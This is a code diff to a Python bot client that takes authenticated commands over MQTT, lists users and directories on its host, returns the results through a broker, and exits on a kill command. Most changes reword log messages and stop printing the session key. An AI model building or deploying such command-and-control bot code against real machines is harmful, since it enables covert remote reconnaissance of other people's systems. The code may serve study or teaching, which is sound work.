@@ -19,8 +19,7 @@ class BotController:
     def __init__(self,
                  secret_key: str = ROOT_SECRET):
         self.secret = self._derive_session_key(secret_key)
-        print("Bot Controller initialized.")
-        print(f"Derived session key: {self.secret}")
+        print("(Info)\t Bot Controller initialized.")
     
     def start(self):
         self.client.start()
@@ -68,7 +67,7 @@ class BotController:
 
     def handle_announce(self, payload: bytes):
         msg = payload.decode(errors="ignore")
-        response = f"Bot alive at {datetime.now().isoformat()} | msg={msg}"
+        response = f"Bot alive at {datetime.now().isoformat()}"
         return RESP_TYPES["ok"], response.encode()
 
     def handle_list_users(self, payload: bytes):
@@ -81,11 +80,14 @@ class BotController:
     def handle_list_dir(self, payload: bytes):
         path = payload.decode()
 
-        subp_command = subprocess.run(["ls", path],
-                                      capture_output=True,
-                                      text=True)
-        if subp_command.returncode != 0:
-            return RESP_TYPES["error"], subp_command.stderr
+        try:
+            subp_command = subprocess.run(["ls", path],
+                                        capture_output=True,
+                                        text=True)
+            if subp_command.returncode != 0:
+                return RESP_TYPES["error"], subp_command.stderr
+        except Exception as e:
+            return RESP_TYPES["error"], e.encode() 
         return RESP_TYPES["ok"], subp_command.stdout
 
     def handle_user_id(self, payload: bytes):
@@ -144,7 +146,7 @@ class BotController:
 
 
     def handle_kill(self, payload: bytes):
-        # return value for keep alive boolean variable
+        print("(Info)\tExiting as a result of the received command.")
         exit()
 
     def handle_commands(self, cmd_type: int, payload: bytes) -> tuple[int, bytes]:
@@ -177,25 +179,22 @@ class Subscriber:
         self.keep_alive = True
     
     def on_connect(self, client, userdata, flags, reason_code, properties):
-        print("Connected")
+        print(f"(Info)\t Bot connected to {self.broker}/{self.port} at {self.topic}")
         client.subscribe(self.topic)
 
     def on_message(self, client, userdata, message):
         try:
             decoded_m = self.ph.decode_frame(message.payload)
             if self.ph.verify_frame_bot_side(decoded_m):
-                print("Message verified!")
                 magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
-                print(f"Cmd: {cmd_type};\nPayload: {payload}")
+                print("(Info)\t Command verified.")
+                print(f"(Info)\t Command type: {cmd_type}\n\t Payload: {payload}")
                 r, p = self.bot_controller.handle_commands(cmd_type=cmd_type, payload=payload)
-                print(f"Ran the command with response '{r}'.\nOutput: '{p}'")
-                print(type(p))
 
                 # send response
                 try:
                     frame = self.ph.build_frame(r, p)
                     encoded_frame  = self.ph.encode_frame(frame)
-                    print(encoded_frame)
                     self.send(encoded_frame)
                     time.sleep(1)
                 except Exception as e:
@@ -209,27 +208,15 @@ class Subscriber:
     def send(self, payload: bytes):
         status = self.client.publish(self.topic, payload)
         if status.rc != mqtt.MQTT_ERR_SUCCESS:
-            print(f"Could not publish the message: {status.rc}")
+            print(f"(Error)\t Could not publish the message: {status.rc}")
         else:
-            print(f"Successfully published!")
+            print(f"(Info)\t Successfully published!")
 
     def start(self):
         self.client.connect(self.broker, self.port)
         self.client.loop_forever()
 
 def main():
-    # # unpack the message
-    # magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
-    # print(f"Cmd: {cmd_type};\nPayload: {payload}")
-
-    # # Handle commands
-    # response, payload = bot_cont.handle_commands(cmd_type=cmd_type, payload=payload)
-
-    # # encode and send frame to the controller
-    # frame = protocol_handler.build_frame(response, payload=payload)
-    # encoded_frame = protocol_handler.encode_frame(frame)
-
-    # bot_cont._publish_frame(encoded_frame)
     sub = Subscriber(
         broker=DEFAULT_BROKER_ADDRESS,
         port=DEFAULT_PORT,
